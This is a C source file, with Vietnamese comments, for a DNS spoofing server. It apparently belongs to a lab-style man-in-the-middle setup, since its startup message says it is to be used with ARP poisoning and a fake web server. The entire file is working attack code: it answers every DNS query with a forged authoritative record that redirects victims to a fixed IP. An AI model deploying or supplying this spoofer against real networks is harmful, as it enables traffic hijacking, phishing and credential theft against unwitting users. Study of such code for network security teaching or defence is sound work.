#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define DNS_PORT 53
#define BUFFER_SIZE 512
#define FAKE_IP "192.168.255.150"  // IP of separate web server machine

// Cấu trúc DNS Header
typedef struct {
    unsigned short id;
    unsigned char rd :1;
    unsigned char tc :1;
    unsigned char aa :1;
    unsigned char opcode :4;
    unsigned char qr :1;
    unsigned char rcode :4;
    unsigned char cd :1;
    unsigned char ad :1;
    unsigned char z :1;
    unsigned char ra :1;
    unsigned short q_count;
    unsigned short ans_count;
    unsigned short auth_count;
    unsigned short add_count;
} DNS_HEADER;

// Cấu trúc Question
typedef struct {
    unsigned short qtype;
    unsigned short qclass;
} QUESTION;

#pragma pack(push, 1)
// Cấu trúc phần Answer
typedef struct {
    unsigned short type;
    unsigned short _class;
    unsigned int ttl;
    unsigned short data_len;
} R_DATA;
#pragma pack(pop)

// Chuyển domain thành định dạng DNS (www.google.com -> 3www6google3com0)
void format_dns_name(unsigned char *dns, unsigned char *host) {
    int lock = 0, i;
    strcat((char*)host, ".");
    for (i = 0; i < strlen((char*)host); i++) {
        if (host[i] == '.') {
            *dns++ = i - lock;
            for (; lock < i; lock++) {
                *dns++ = host[lock];
            }
            lock++;
        }
    }
    *dns++ = '\0';
}

// Add struct for debug printing
void print_domain_name(unsigned char* reader) {
    int i;
    printf("Domain: ");
    for(i = 0; i < strlen((char*)reader); i++) {
        printf("%c", reader[i] >= 32 ? reader[i] : '.');
    }
    printf("\n");
}

int main() {
    int sockfd;
    struct sockaddr_in server, client;
    unsigned char buffer[BUFFER_SIZE];
    socklen_t client_len = sizeof(client);

    // Tạo UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Thêm SO_REUSEADDR
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("setsockopt failed");
        exit(1);
    }

    // Cấu hình địa chỉ server (lắng nghe trên port 53)
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(DNS_PORT);

    // Bind socket
    if (bind(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("Bind failed");
        close(sockfd);
        exit(1);
    }

    printf("=== DNS Spoofing Server Started ===\n");
    printf("Listening on UDP port %d\n", DNS_PORT);
    printf("Will redirect all DNS queries to Web Server at: %s\n", FAKE_IP);
    printf("Make sure you're running:\n");
    printf("1. arp_poisoning on this machine\n");
    printf("2. web_server is running on %s\n\n", FAKE_IP);

    while (1) {
        // Nhận gói tin DNS từ client
        int recv_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&client, &client_len);
        if (recv_len < 0) {
            perror("recvfrom failed");
            continue;
        }

        printf("Nhận truy vấn DNS...\n");

        DNS_HEADER *dns = (DNS_HEADER*)buffer;
        unsigned char *qname = &buffer[sizeof(DNS_HEADER)];
        QUESTION *qinfo = (QUESTION*)&buffer[sizeof(DNS_HEADER) + (strlen((const char*)qname) + 1)];

        // Sửa lại cách xử lý DNS response
        dns->qr = 1;      // Response
        dns->aa = 1;      // Authoritative
        dns->ra = 1;      // Recursion Available
        dns->rcode = 0;   // No error
        dns->ans_count = htons(1);

        // Print more debug info
        printf("[DNS] Query received from %s\n", inet_ntoa(client.sin_addr));
        print_domain_name(qname);
        printf("[DNS] Redirecting to %s:80\n", FAKE_IP);
        
        // Make sure response is properly formatted
        unsigned char *response = &buffer[sizeof(DNS_HEADER) + strlen((const char*)qname) + sizeof(QUESTION) + 1];
        
        // Set response records
        *response++ = 0xc0;
        *response++ = 0x0c;

        R_DATA *rdata = (R_DATA*)response;
        rdata->type = htons(1);
        rdata->_class = htons(1);
        rdata->ttl = htonl(300);
        rdata->data_len = htons(4);
        response += sizeof(R_DATA);

        // Add fake IP
        struct in_addr fake_ip;
        inet_aton(FAKE_IP, &fake_ip);
        memcpy(response, &fake_ip, sizeof(fake_ip));
        response += 4;

        // Calculate total size
        int response_size = response - buffer;
        
        // Send response
        sendto(sockfd, buffer, response_size, 0, (struct sockaddr*)&client, client_len);
        printf("[DNS] Response sent (%d bytes)\n", response_size);
    }

    close(sockfd);
    return 0;
}
